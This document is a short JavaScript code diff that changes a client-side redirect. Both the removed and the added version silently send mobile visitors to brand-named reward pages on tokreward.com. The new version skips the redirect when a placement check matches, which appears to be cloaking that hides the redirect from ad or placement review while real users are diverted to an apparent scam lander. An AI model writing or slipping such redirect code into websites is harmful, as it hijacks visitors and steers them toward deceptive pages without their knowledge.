@@ -1,5 +1,8 @@
-const utm = new URLSearchParams(window.location.search);
-const ttclid = utm.get("ttclid");
-const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-const lander = `https://tokreward.com/sephora.html?slug=${document.location.hostname.split('.')[0]}`;
-if (ttclid && mobile) { window.location.href = lander; } else { }
+const urlParams = new URLSearchParams(window.location.search);
+const utmXXX = urlParams.get("xxx");
+const s = urlParams.get("s");
+const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+const lander = `https://tokreward.com/sheinesp.html?slug=${s}`;
+if (utmXXX === "__PLACEMENT__") { }
+else if (isMobileDevice) { window.location.href = lander; } 
+else { }
